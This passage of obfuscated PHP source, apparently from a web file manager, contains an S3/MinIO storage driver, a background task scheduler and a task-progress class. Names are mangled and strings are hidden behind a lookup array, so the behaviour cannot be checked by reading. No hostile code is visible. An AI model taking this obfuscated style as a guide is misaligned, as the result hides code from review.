$Öîè „[8]); $ÂŞä»›ö = empty($èã±ÅŞ) && $èã±ÅŞ !== $Öîè „[197] ? $Öîè „[12] : $èã±ÅŞ . $Öîè „[8]; return $this->client->getBucket($this->bucket, $ÂŞä»›ö, $”ùÜÂ½Ÿ, $¹İšÏû”, $Ü³°Šƒı, !0); } public function has($õªÍ°ş™, $Éğ±Ş­Ó = false, $ÅĞ¬ÊàÏ = true) { $é¢”Ñ™ü =& $_SERVER[ïëó©ÒÚ]; $õªÍ°ş™ = trim($õªÍ°ş™, $é¢”Ñ™ü[8]); $ş¾«æÓü = empty($õªÍ°ş™) && $õªÍ°ş™ !== $é¢”Ñ™ü[197] ? $é¢”Ñ™ü[12] : $õªÍ°ş™ . $é¢”Ñ™ü[8]; $óõÀô©ª = null; $‡´•¤‹İ = 500; $Ò©¡Ë«¡ = $é¢”Ñ™ü[8]; $Ô„åê¥– = $‡Üéûî² = array(); while (!0) { $úêİÛü = $this->listObjs($õªÍ°ş™, $óõÀô©ª, $‡´•¤‹İ, $Ò©¡Ë«¡); if (!$úêİÛü) { break; } $óõÀô©ª = $úêİÛü[$é¢”Ñ™ü[206]]; $øç°¾Ûı = $úêİÛü[$é¢”Ñ™ü[204]]; $¿ş§ş»ã = $úêİÛü[$é¢”Ñ™ü[205]]; if (empty($øç°¾Ûı) && empty($¿ş§ş»ã)) { break; } if (count($øç°¾Ûı) == 1 && $øç°¾Ûı[0][$é¢”Ñ™ü[32]] == $ş¾«æÓü) { break; } if ($Éğ±Ş­Ó) { if (count($øç°¾Ûı)) { $øç°¾Ûı = array_column($øç°¾Ûı, $é¢”Ñ™ü[32]); $Ô„åê¥– = array_merge($Ô„åê¥–, $øç°¾Ûı); } if (count($¿ş§ş»ã)) { $¿ş§ş»ã = array_column($¿ş§ş»ã, $é¢”Ñ™ü[32]); $‡Üéûî² = array_merge($‡Üéûî², $¿ş§ş»ã); } if ($óõÀô©ª === null) { break; } continue; } if ($ÅĞ¬ÊàÏ) { if (!empty($øç°¾Ûı)) { if (count($øç°¾Ûı) > 1 || isset($øç°¾Ûı[0][$é¢”Ñ™ü[32]]) && $øç°¾Ûı[0][$é¢”Ñ™ü[32]] != $ş¾«æÓü) { return !0; } } } else { if (!empty($¿ş§ş»ã)) { return !0; } } if ($óõÀô©ª === null) { break; } } if ($Éğ±Ş­Ó) { $Ô„åê¥– = array_diff($Ô„åê¥–, array($ş¾«æÓü)); $Ô„åê¥– = count(array_unique($Ô„åê¥–)); $‡Üéûî² = count(array_unique($‡Üéûî²)); return array($é¢”Ñ™ü[207] => $Ô„åê¥–, $é¢”Ñ™ü[208] => $‡Üéûî²); } return !1; } public function listAll($í×ñ­àµ) { $ÊªÓ­ÈÓ =& $_SERVER[ïëó©ÒÚ]; $³‚–ú› = $this->fileList($í×ñ­àµ, $ÊªÓ­ÈÓ[12], !0); $éÊ¥çº– = array(); foreach ($³‚–ú›[$ÊªÓ­ÈÓ[83]] as $÷áª÷¦) { $éÊ¥çº–[$÷áª÷¦[$ÊªÓ­ÈÓ[32]]] = $÷áª÷¦[$ÊªÓ­ÈÓ[76]]; } foreach ($³‚–ú›[$ÊªÓ­ÈÓ[82]] as $÷áª÷¦) { if (is_string($÷áª÷¦)) { $éÊ¥çº–[$÷áª÷¦] = 0; } } return $this->listAllFiles($í×ñ­àµ, array_keys($éÊ¥çº–), $éÊ¥çº–); } public function canRead($¦ØÆ¦¾) { $¸‘·Ö× =& $_SERVER[ïëó©ÒÚ]; $â’á˜² = $this->client->getAccessControlPolicy($this->bucket, $¦ØÆ¦¾); if (!$â’á˜²) { return !1; } return in_array($â’á˜², array($¸‘·Ö×[209], $¸‘·Ö×[210], $¸‘·Ö×[211])) ? !0 : !1; } public function canWrite($æš’·¬•) { $…†ä®Ì› =& $_SERVER[ïëó©ÒÚ]; $Ğ¡³¨Çİ = $this->client->getAccessControlPolicy($this->bucket, $æš’·¬•); if (!$Ğ¡³¨Çİ) { return !1; } return in_array($Ğ¡³¨Çİ, array($…†ä®Ì›[209], $…†ä®Ì›[210])) ? !0 : !1; } public function getContent($£ª¾É±) { return $this->client->getObject($this->bucket, $£ª¾É±); } public function setContent($¨Ş¬»’–, $Ğáîëİµ = '', $ó÷ÙüÌî = false) { $ÂÎĞ–Ú™ =& $_SERVER[ïëó©ÒÚ]; $¨Ş¬»’– = $ó÷ÙüÌî ? trim($¨Ş¬»’–, $ÂÎĞ–Ú™[8]) . $ÂÎĞ–Ú™[8] : $¨Ş¬»’–; $×÷ç…ûÜ = get_file_mime(get_path_ext($¨Ş¬»’–)); $–Æšå = $this->client->putObject($Ğáîëİµ, $this->bucket, $¨Ş¬»’–, $ÂÎĞ–Ú™[198], array(), $×÷ç…ûÜ); if (!$–Æšå) { return !1; } if ($ó÷ÙüÌî) { return !0; } $this->cacheMethod(null, null); $–Æšå = $this->copyFile($¨Ş¬»’–, $¨Ş¬»’–, array($ÂÎĞ–Ú™[212] => $–Æšå[$ÂÎĞ–Ú™[213]])); return $–Æšå ? !0 : !1; } public function fileSubstr($ËÊß¬ƒ», $ÀåÓ´Õ», $ºÙÅüÉ) { $Ä€—·¹Ø = $ÀåÓ´Õ» + $ºÙÅüÉ - 1; return $this->client->getObject($this->bucket, $ËÊß¬ƒ», array($_SERVER[ïëó©ÒÚ][214] => "\x62\x79\x74\145\x73\75{$ÀåÓ´Õ»}\x2d{$Ä€—·¹Ø}")); } public function upload($­É‰®—«, $½®ğª¦á, $šÇ€Õ´ù = false, $ÆŞİ•Ø = REPEAT_REPLACE) { $Ü­˜ò­ß =& $_SERVER[ïëó©ÒÚ]; $…¦É¸Ê÷ = array($Ü­˜ò­ß[212] => @md5_file($½®ğª¦á)); $„«Öø„Ø = array($Ü­˜ò­ß[215] => get_file_mime(get_path_ext($­É‰®—«))); if (IO::size($½®ğª¦á) <= 1024 * 1024 * 200) { $¬ì¨Šú = $this->client->putObjectFile($½®ğª¦á, $this->bucket, $­É‰®—«, $Ü­˜ò­ß[198], $…¦É¸Ê÷, $„«Öø„Ø); return !empty($¬ì¨Šú) ? $this->getPathOuter($­É‰®—«) : !1; } $ÕËµ¼û¸ = $this->client->multiUploadObject($½®ğª¦á, $this->bucket, trim($­É‰®—«, $Ü­˜ò­ß[8]), $…¦É¸Ê÷, $„«Öø„Ø); return $ÕËµ¼û¸ ? $this->getPathOuter($­É‰®—«) : !1; } public function download($ÚĞúØ¡, $ô•Ÿ¼Óº) { if (!@is_dir($this->pathFather($ô•Ÿ¼Óº)) && !IO::mkdir($this->pathFather($ô•Ÿ¼Óº))) { return !1; } $¨¿ÔÄ‰º = $this->client->getObject($this->bucket, $ÚĞúØ¡, array(), $ô•Ÿ¼Óº); return $¨¿ÔÄ‰º !== !1 ? $ô•Ÿ¼Óº : !1; } public function link($¿ú–Æ¤ö, $­ùß»½ò = array()) { $æŠ³Â’ =& $_SERVER[ïëó©ÒÚ]; if ($this->signVer == $æŠ³Â’[216]) { return $this->client->getAuthenticatedURL($this->bucket, $¿ú–Æ¤ö, 3600 * 12, $­ùß»½ò); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($¿ú–Æ¤ö, $æŠ³Â’[8]), 3600 * 12, $this->region, array(), !0, $­ùß»½ò); } public function fileOut($Äô”ÓßÚ, $æ‘©¢ı‹ = false, $éêÄ¥Ùî = false, $ÌÛŒäœ• = '') { $î…½Ñé =& $_SERVER[ïëó©ÒÚ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Äô”ÓßÚ, $æ‘©¢ı‹, $éêÄ¥Ùî, $ÌÛŒäœ•); } if (!$éêÄ¥Ùî) { $éêÄ¥Ùî = $this->pathThis($Äô”ÓßÚ); } $çíÌÖåÉ = get_file_mime(get_path_ext($éêÄ¥Ùî)); if ($çíÌÖåÉ == $î…½Ñé[217]) { return parent::fileOut($Äô”ÓßÚ, $æ‘©¢ı‹, $éêÄ¥Ùî, $ÌÛŒäœ•); } $²Åë‘¾® = array($î…½Ñé[218] => $çíÌÖåÉ); if ($æ‘©¢ı‹) { $²Åë‘¾®[$î…½Ñé[219]] = $î…½Ñé[220] . rawurlencode($éêÄ¥Ùî); } else { } $ºØ«ŒÏç = $this->link($Äô”ÓßÚ, $²Åë‘¾®); $this->fileOutLink($ºØ«ŒÏç); } public function fileOutServer($‰Š‚Âå™, $îÁ¹¼Â = false, $¥áä‰ß¢ = false, $å›ÆÎ­Û = '') { parent::fileOut($‰Š‚Âå™, $îÁ¹¼Â, $¥áä‰ß¢, $å›ÆÎ­Û); } public function fileOutImageServer($¿ÒÍïî, $È•·ñ²Ğ = 250) { parent::fileOutImage($¿ÒÍïî, $È•·ñ²Ğ); } public function hashMd5($Ö’ÊæÍ, $©¿–¹²Û = '') { $¬›Ó£†ò =& $_SERVER[ïëó©ÒÚ]; $ØÛÓ¯‘² = $this->objectMeta($Ö’ÊæÍ); if (!$ØÛÓ¯‘²) { return !1; } $©¿–¹²Û = $©¿–¹²Û ? $©¿–¹²Û : _get($ØÛÓ¯‘², $¬›Ó£†ò[221]); $©¿–¹²Û = $©¿–¹²Û ? $©¿–¹²Û : _get($ØÛÓ¯‘², $¬›Ó£†ò[213], $¬›Ó£†ò[12]); return $©¿–¹²Û; } public function uploadFormData($¹å‹‹İç, $¼şÂØ‚„ = 3600) { $ˆ­°şäÒ =& $_SERVER[ïëó©ÒÚ]; $é£¿ôŠä = $this->pathFather($¹å‹‹İç); $’áÌèüÓ = $this->client->getHttpUploadPostParams($this->bucket, $é£¿ôŠä, $ˆ­°şäÒ[198], $¼şÂØ‚„); return array_merge((array) $’áÌèüÓ, array($ˆ­°şäÒ[181] => $this->getHost())); } public function multiUploadFormData($íÖ™õ½¯, $ë¹Ö²‘æ = 3600) { $­™ŠË»µ =& $_SERVER[ïëó©ÒÚ]; $·“°¶½Ü = gmdate($­™ŠË»µ[222]); $İ“õªï× = array(); $îïµ…îİ = $this->client->getUploadId($this->bucket, $íÖ™õ½¯, $İ“õªï×); if (!$îïµ…îİ) { return !1; } return array($­™ŠË»µ[223] => $îïµ…îİ, $­™ŠË»µ[181] => $this->getHost() . $­™ŠË»µ[8] . $this->pathEncode($íÖ™õ½¯), $­™ŠË»µ[224] => $·“°¶½Ü, $­™ŠË»µ[94] => $íÖ™õ½¯); } public function multiUploadAuthData($ï¬ğ‰§Ã, $Æ‡Öƒ = array()) { $Ûğµè¿‡ =& $_SERVER[ïëó©ÒÚ]; $àˆß’½Î = isset($Æ‡Öƒ[$Ûğµè¿‡[224]]) ? $Æ‡Öƒ[$Ûğµè¿‡[224]] : gmdate($Ûğµè¿‡[222]); $”Î«Îö = isset($Æ‡Öƒ[$Ûğµè¿‡[174]]) ? $Æ‡Öƒ[$Ûğµè¿‡[174]] : $Ûğµè¿‡[12]; $İ¶¢îö… = $Æ‡Öƒ[$Ûğµè¿‡[94]]; unset($Æ‡Öƒ[$Ûğµè¿‡[94]]); if (isset($Æ‡Öƒ[$Ûğµè¿‡[225]])) { $Æ‡Öƒ[$Ûğµè¿‡[224]] = $àˆß’½Î; return $this->listUploadParts($İ¶¢îö…, $Æ‡Öƒ); } $µÜ…¹ë = array($Ûğµè¿‡[226], $Ûğµè¿‡[12], $Ûğµè¿‡[120], $Ûğµè¿‡[12], "\170\55\141\155\x7a\x2d\144\x61\164\x65\72{$àˆß’½Î}", $Ûğµè¿‡[8] . $this->bucket . $Ûğµè¿‡[8] . $this->pathEncode($İ¶¢îö…) . $”Î«Îö); if (strpos($”Î«Îö, $Ûğµè¿‡[227]) === 0) { $µÜ…¹ë[0] = $Ûğµè¿‡[228]; } if (isset($Æ‡Öƒ[$Ûğµè¿‡[229]]) && $Æ‡Öƒ[$Ûğµè¿‡[229]] == $Ûğµè¿‡[230]) { $µÜ…¹ë[0] = $Ûğµè¿‡[230]; } $‰¾´Ã§ˆ = implode($Ûğµè¿‡[231], $µÜ…¹ë); $©í»½°Â = base64_encode(hash_hmac($Ûğµè¿‡[232], $‰¾´Ã§ˆ, $this->secret, !0)); $×°­¶áí = $Ûğµè¿‡[233] . $this->accessKey . $Ûğµè¿‡[4] . $©í»½°Â; if (strpos($”Î«Îö, $Ûğµè¿‡[227]) === 0) { return array($Ûğµè¿‡[234] => $×°­¶áí, $Ûğµè¿‡[224] => $àˆß’½Î); } return $×°­¶áí; } public function listUploadParts($½Ì¥»¼î, $ôâ•€ìÈ = array()) { $”òØ½§ =& $_SERVER[ïëó©ÒÚ]; $Â×¸ƒßÛ = str_replace($”òØ½§[235], $”òØ½§[12], $ôâ•€ìÈ[$”òØ½§[174]]); $Æ²³¤Ç« = $this->client->listParts($this->bucket, $½Ì¥»¼î, $Â×¸ƒßÛ); if (!$Æ²³¤Ç«) { return !1; } unset($ôâ•€ìÈ[$”òØ½§[225]], $ôâ•€ìÈ[$”òØ½§[229]]); $ôâ•€ìÈ[$”òØ½§[94]] = $½Ì¥»¼î; $Ü–İ¸ÅÕ = $this->multiUploadAuthData($½Ì¥»¼î, $ôâ•€ìÈ); if (empty($Ü–İ¸ÅÕ)) { return !1; } return array($”òØ½§[234] => $Ü–İ¸ÅÕ, $”òØ½§[224] => $ôâ•€ìÈ[$”òØ½§[224]], $”òØ½§[236] => $Æ²³¤Ç«); } public function getHost() { return parent::getHost() . $_SERVER[ïëó©ÒÚ][8] . $this->bucket; } public function size($è×øã½¥) { $óÉ®ŠìÄ = $this->objectMeta($è×øã½¥); return $óÉ®ŠìÄ ? $óÉ®ŠìÄ[$_SERVER[ïëó©ÒÚ][76]] : 0; } public function info($ù‰¡¢¹) { if ($this->isFolder($ù‰¡¢¹)) { return $this->folderInfo($ù‰¡¢¹); } else { if ($this->isFile($ù‰¡¢¹)) { return $this->fileInfo($ù‰¡¢¹); } } return !1; } public function exist($û¢åŒ «) { return $this->isFile($û¢åŒ «) || $this->isFolder($û¢åŒ «); } public function isFile($‰œÄÂ™) { return !$this->isFolder($‰œÄÂ™) && $this->objectMeta($‰œÄÂ™); } public function isFolder($Á»ùÜ³³) { return $this->cacheMethod($_SERVER[ïëó©ÒÚ][165], $Á»ùÜ³³); } protected function objectMeta($šµû™ˆ¡) { return $this->cacheMethod($_SERVER[ïëó©ÒÚ][167], $šµû™ˆ¡); } protected function _objectMeta($×ËÅ‡†) { $‡Ø‚Ñ ñ =& $_SERVER[ïëó©ÒÚ]; $×ËÅ‡† = rtrim($×ËÅ‡†, $‡Ø‚Ñ ñ[8]); try { $«È‹Ş³¹ = $this->client->getObjectInfo($this->bucket, $×ËÅ‡†); if (!isset($«È‹Ş³¹[$‡Ø‚Ñ ñ[221]]) && isset($«È‹Ş³¹[$‡Ø‚Ñ ñ[237]])) { $«È‹Ş³¹[$‡Ø‚Ñ ñ[221]] = $«È‹Ş³¹[$‡Ø‚Ñ ñ[237]]; } } catch (Exception $Üã³ßÏÚ) { $«È‹Ş³¹ = !1; } if (!$«È‹Ş³¹) { } return $«È‹Ş³¹; } protected function _isFolder($ˆ¨ù©©«) { $¢‘Úı•á =& $_SERVER[ïëó©ÒÚ]; $ˆ¨ù©©« = rtrim($ˆ¨ù©©«, $¢‘Úı•á[8]); if ($ˆ¨ù©©« == $¢‘Úı•á[12] || $ˆ¨ù©©« == $¢‘Úı•á[8]) { return !0; } $ö¼ÁË• = $this->client->getBucket($this->bucket, $ˆ¨ù©©«, null, 1); if (empty($ö¼ÁË•[$¢‘Úı•á[204]])) { return !1; } $øˆ—í¢ = $ö¼ÁË•[$¢‘Úı•á[204]][0][$¢‘Úı•á[32]]; return stripos($øˆ—í¢, $ˆ¨ù©©« . $¢‘Úı•á[8]) === 0 ? !0 : !1; if (substr($øˆ—í¢, -1) == $¢‘Úı•á[8]) { return !0; } if (get_path_this($øˆ—í¢) == get_path_this($ˆ¨ù©©«)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ˆŠã®À‘) { parent::__construct($ˆŠã®À‘); $this->signatureVersion($_SERVER[ïëó©ÒÚ][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto BÔ†›ñ¶£‘; Aá´Ã‹æµ÷: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ûæû°õ =& $_SERVER[ïëó©ÒÚ]; if (self::valueGet($Ûæû°õ[760]) != $Ûæû°õ[88]) { return; } if (self::valueGet($Ûæû°õ[1620]) == $Ûæû°õ[88]) { $ò‰ˆ­°Ö = self::valueGet($Ûæû°õ[1621]); if (time() - $ò‰ˆ­°Ö > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$Ûæû°õ[1622]] = 1; self::valueSet($Ûæû°õ[1620], $Ûæû°õ[88]); self::log($Ûæû°õ[1623] . ACTION . $Ûæû°õ[1624]); Session::$data = array(); Session::$sessionSign = $Ûæû°õ[12]; $GLOBALS[$Ûæû°õ[512]] = 1; Hook::bind($Ûæû°õ[1625], $Ûæû°õ[1626]); $Š÷÷æôá = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ûæû°õ[760]) != $Ûæû°õ[88]) { self::valueSet($Ûæû°õ[1620], $Ûæû°õ[197]); self::log($Ûæû°õ[1627]); die; } $’†÷Ó‘¶ = time(); if ($’†÷Ó‘¶ - $Š÷÷æôá >= 60) { self::valueSet(array($Ûæû°õ[1620] => $Ûæû°õ[88], $Ûæû°õ[1621] => $’†÷Ó‘¶), !1); $Š÷÷æôá = $’†÷Ó‘¶; } if (!file_exists(USER_SYSTEM . $Ûæû°õ[1628])) { self::valueSet(array($Ûæû°õ[1620] => $Ûæû°õ[197], $Ûæû°õ[760] => $Ûæû°õ[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ñÈÄŒ‹Û =& $_SERVER[ïëó©ÒÚ]; http_close(); self::valueSet($ñÈÄŒ‹Û[760], $ñÈÄŒ‹Û[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ñÈÄŒ‹Û[1620] => $ñÈÄŒ‹Û[197], $ñÈÄŒ‹Û[760] => $ñÈÄŒ‹Û[88]), !1); } public static function taskSwitch() { $ê„Ê°” =& $_SERVER[ïëó©ÒÚ]; $ªàó¾Ğâ = self::valueGet($ê„Ê°”[760]) == $ê„Ê°”[88] ? $ê„Ê°”[197] : $ê„Ê°”[88]; self::valueSet($ê„Ê°”[760], $ªàó¾Ğâ); } public static function shutdownEvent() { $Ô®¿Åßƒ =& $_SERVER[ïëó©ÒÚ]; self::valueSet($Ô®¿Åßƒ[1620], $Ô®¿Åßƒ[197]); self::log($Ô®¿Åßƒ[1629]); } public static function config($…ºĞéƒ‰, $¸óËæãÏ) { self::valueSet($_SERVER[ïëó©ÒÚ][760], $…ºĞéƒ‰); } private static function taskRunAll() { $˜¨‚Î‘” =& $_SERVER[ïëó©ÒÚ]; $‘â—ÁÉ— = timeFloat(); $ºšûÈêû = Model($˜¨‚Î‘”[1630])->listData(); $ƒ•Œá = count($ºšûÈêû); for ($Ù‘·Ó“ù = 0; $Ù‘·Ó“ù < $ƒ•Œá; $Ù‘·Ó“ù++) { $ãü™ ªÖ = $ºšûÈêû[$Ù‘·Ó“ù]; if (!$ãü™ ªÖ[$˜¨‚Î‘”[399]] || $ãü™ ªÖ[$˜¨‚Î‘”[1631]] != $˜¨‚Î‘”[88]) { continue; } if (!self::taskTimeCheck($ãü™ ªÖ)) { continue; } self::taskRun($ãü™ ªÖ); } Hook::trigger($˜¨‚Î‘”[1632]); self::taskQueueRun($‘â—ÁÉ—); } private static function taskQueueRun($€öĞê») { $†şûĞÖØ = 10; while (!0) { $ÏõÑ©ª¿ = TaskQueue::run(); if ($ÏõÑ©ª¿ === !1) { break; } if (timeFloat() - $€öĞê» >= $†şûĞÖØ) { break; } } } private static function taskTimeCheck($©°¶®äï) { $ß—Úèì¹ =& $_SERVER[ïëó©ÒÚ]; $Ãšğ²¹Ş = json_decode($©°¶®äï[$ß—Úèì¹[203]], !0); $¡è‡·é = intval($©°¶®äï[$ß—Úèì¹[1621]]); $£áåµåá = strtotime($ß—Úèì¹[1633] . $Ãšğ²¹Ş[$ß—Úèì¹[1634]] . $ß—Úèì¹[1635]) - strtotime($ß—Úèì¹[1636]); $Ù©Ş…ô = time() - strtotime(date($ß—Úèì¹[1637]) . $ß—Úèì¹[1638]); $º¹¥ãÄ = $Ù©Ş…ô >= $£áåµåá && $Ù©Ş…ô <= $£áåµåá + 3600; switch ($Ãšğ²¹Ş[$ß—Úèì¹[33]]) { case $ß—Úèì¹[1639]: if (time() - $¡è‡·é < 3600 * 24 * 30) { return !1; } if ($Ãšğ²¹Ş[$ß—Úèì¹[1639]] == date($ß—Úèì¹[1640]) && $º¹¥ãÄ) { return !0; } break; case $ß—Úèì¹[1641]: if (time() - $¡è‡·é < 3600 * 24 * 7) { return !1; } $‹³ê‹ƒÈ = date($ß—Úèì¹[1642]) == 0 ? 7 : date($ß—Úèì¹[1642]); if ($Ãšğ²¹Ş[$ß—Úèì¹[1641]] == $‹³ê‹ƒÈ && $º¹¥ãÄ) { return !0; } break; case $ß—Úèì¹[1634]: if (time() - $¡è‡·é < 3600 * 24) { return !1; } if ($º¹¥ãÄ) { return !0; } break; case $ß—Úèì¹[1643]: if (time() - $¡è‡·é >= floatval($Ãšğ²¹Ş[$ß—Úèì¹[1643]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $º•ãÂ„û =& $_SERVER[ïëó©ÒÚ]; static $ºØÙÛåõ = 0; $Æ‘î•¨è = 300; if (!$ºØÙÛåõ) { $ºØÙÛåõ = time(); } if (time() - $ºØÙÛåõ < $Æ‘î•¨è) { return; } $ºØÙÛåõ = time(); $ı³Úü×¯ = Model($º•ãÂ„û[522])->db($º•ãÂ„û[12]); if ($ı³Úü×¯) { $ı³Úü×¯->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($º•ãÂ„û[1644], $º•ãÂ„û[1645]); die; } } public static function taskRun($Ëşó¾ïØ) { $’€Å‘ãÀ =& $_SERVER[ïëó©ÒÚ]; self::log($’€Å‘ãÀ[1646] . $Ëşó¾ïØ[$’€Å‘ãÀ[399]] . $’€Å‘ãÀ[1647] . $Ëşó¾ïØ[$’€Å‘ãÀ[32]] . $’€Å‘ãÀ[1648] . $Ëşó¾ïØ[$’€Å‘ãÀ[1649]]); Model($’€Å‘ãÀ[1630])->run($Ëşó¾ïØ[$’€Å‘ãÀ[399]]); $€¬‡½¯ = timeFloat(); $˜‚Âº¼ = $’€Å‘ãÀ[12]; switch ($Ëşó¾ïØ[$’€Å‘ãÀ[33]]) { case $’€Å‘ãÀ[307]: $ô´õÏßˆ = url_request($Ëşó¾ïØ[$’€Å‘ãÀ[1649]], $’€Å‘ãÀ[230], !1, !1, !1, !1, 10); if ($ô´õÏßˆ[$’€Å‘ãÀ[760]]) { $˜‚Âº¼ = strlen($ô´õÏßˆ[$’€Å‘ãÀ[1196]]); } break; case $’€Å‘ãÀ[229]: $˜‚Âº¼ = Hook::apply($Ëşó¾ïØ[$’€Å‘ãÀ[1649]]); default: break; } Model($’€Å‘ãÀ[1650])->add(array($’€Å‘ãÀ[1651] => $’€Å‘ãÀ[12], $’€Å‘ãÀ[1652] => $’€Å‘ãÀ[197], $’€Å‘ãÀ[33] => $’€Å‘ãÀ[1653] . $Ëşó¾ïØ[$’€Å‘ãÀ[399]], $’€Å‘ãÀ[1654] => json_encode(array($’€Å‘ãÀ[32] => $Ëşó¾ïØ[$’€Å‘ãÀ[32]], $’€Å‘ãÀ[1655] => timeFloat() - $€¬‡½¯, $’€Å‘ãÀ[293] => $˜‚Âº¼)))); $¢âÆ‚ªË = $˜‚Âº¼ ? $’€Å‘ãÀ[1656] . $˜‚Âº¼ : $’€Å‘ãÀ[12]; self::log($’€Å‘ãÀ[1657] . $Ëşó¾ïØ[$’€Å‘ãÀ[399]] . $’€Å‘ãÀ[164] . $¢âÆ‚ªË); return !0; } private static function valueGet($Ì²·è†Ş) { $Ø ‹ˆÈ³ =& $_SERVER[ïëó©ÒÚ]; $¨€Ãå = $Ø ‹ˆÈ³[1658]; $¬õßØË‚ = Model($Ø ‹ˆÈ³[444])->get($Ì²·è†Ş, $¨€Ãå); if (is_null($¬õßØË‚)) { Model($Ø ‹ˆÈ³[444])->set($Ø ‹ˆÈ³[760], $Ø ‹ˆÈ³[88], $¨€Ãå); Model($Ø ‹ˆÈ³[444])->set($Ø ‹ˆÈ³[1620], $Ø ‹ˆÈ³[197], $¨€Ãå); $¬õßØË‚ = Model($Ø ‹ˆÈ³[444])->get($Ì²·è†Ş, $¨€Ãå); } return $¬õßØË‚; } private static function valueSet($Ò¼•–ˆ¯, $íõ€Ù‹—) { $Ş¬æÈĞß =& $_SERVER[ïëó©ÒÚ]; $åˆ ‘² = $Ş¬æÈĞß[1659]; CacheLock::lock($åˆ ‘²); $äéı†¢› = Model($Ş¬æÈĞß[444])->set($Ò¼•–ˆ¯, $íõ€Ù‹—, $Ş¬æÈĞß[1658]); CacheLock::unlock($åˆ ‘²); return $äéı†¢›; } protected static function log($½¹ß½ñó) { write_log($½¹ß½ñó, $_SERVER[ïëó©ÒÚ][1645]); } private static function cacheClear() { $÷ä‚€ˆ =& $_SERVER[ïëó©ÒÚ]; Cache::clearMemory(Model($÷ä‚€ˆ[444])->cacheKey($÷ä‚€ˆ[1658])); Cache::clearMemory(Model($÷ä‚€ˆ[444])->cacheKey($÷ä‚€ˆ[1660])); Model($÷ä‚€ˆ[1630])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\162\165\156\156\151\x6e\x67"; const STATYS_KILL = "\153\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($•óï‚¿ˆ, $›† ÔÆ© = '', $Ê°‡±õ = 0, $ ¿÷üä‘ = '') { $û§í¯‘İ =& $_SERVER[ïëó©ÒÚ]; if (self::get($•óï‚¿ˆ)) { return; } $this->task = array($û§í¯‘İ[399] => $•óï‚¿ˆ, $û§í¯‘İ[1661] => USER_ID, $û§í¯‘İ[1560] => $ ¿÷üä‘, $û§í¯‘İ[33] => $›† ÔÆ©, $û§í¯‘İ[1067] => $û§í¯‘İ[12], $û§í¯‘İ[796] => $Ê°‡±õ, $û§í¯‘İ[1662] => 0, $û§í¯‘İ[1663] => 0, $û§í¯‘İ[1664] => 0, $û§í¯‘İ[1665] => timeFloat(), $û§í¯‘İ[1666] => 0, $û§í¯‘İ[1667] => 0, $û§í¯‘İ[1668] => 0, $û§í¯‘İ[1669] => 0, $û§í¯‘İ[760] => $û§í¯‘İ[1620]); $GLOBALS[$û§í¯‘İ[1670]] = 1; Hook::bind($û§í¯‘İ[1625], array($this, $û§í¯‘İ[1671])); Hook::bind($û§í¯‘İ[1672], array($this, $û§í¯‘İ[1673])); $this->startAfter(); Hook::trigger($û§í¯‘İ[1674], $this->task); $this->task[$û§í¯‘İ[1667]] = timeFloat(); } public function end() { $ñ¼Ÿô”ƒ =& $_SERVER[ïëó©ÒÚ]; if (!$this->task) { return; } if ($this->task[$ñ¼Ÿô”ƒ[1667]]) { self::valueSet($this->task[$ñ¼Ÿô”ƒ[399]], !1); } $æ²ÂÚÚÀ = timeFloat() - $this->task[$ñ¼Ÿô”ƒ[1665]]; self::log($ñ¼Ÿô”ƒ[1675] . $this->task[$ñ¼Ÿô”ƒ[399]] . $ñ¼Ÿô”ƒ[1676] . $æ²ÂÚÚÀ . $ñ¼Ÿô”ƒ[1677]); Hook::unbind($ñ¼Ÿô”ƒ[1625], array($this, $ñ¼Ÿô”ƒ[1671])); Hook::unbind($ñ¼Ÿô”ƒ[1672], array($this, $ñ¼Ÿô”ƒ[1673])); $this->endAfter(); $this->task = !1; } public function update($…Æºâ¨Ù = 0, $“¼Šï° = false) { $Ğ¾Ï£ÃÖ =& $_SERVER[ïëó©ÒÚ]; $’Û”–Ô‹ =& $this->task; if (!$’Û”–Ô‹) { return; } $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1662]] += $…Æºâ¨Ù; $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1666]] = timeFloat(); if ($’Û”–Ô‹[$Ğ¾Ï£ÃÖ[796]]) { if ($’Û”–Ô‹[$Ğ¾Ï£ÃÖ[796]] < $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1662]]) { $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[796]] = $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1662]]; } $Üıç»Í = timeFloat() - $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1665]] - $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1668]]; if ($Üıç»Í <= 0) { $Üıç»Í = 0.001; } $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1663]] = $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1662]] / $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[796]]; $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1664]] = $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1662]] / $Üıç»Í; if ($’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1663]] > 0) { $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1669]] = $Üıç»Í * (1 - $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1663]]) / $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1663]]; } $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1669]] = $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1669]] <= 0 ? 0 : $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1669]]; } $this->updateAfter(); $ş¢ç¤¨í = 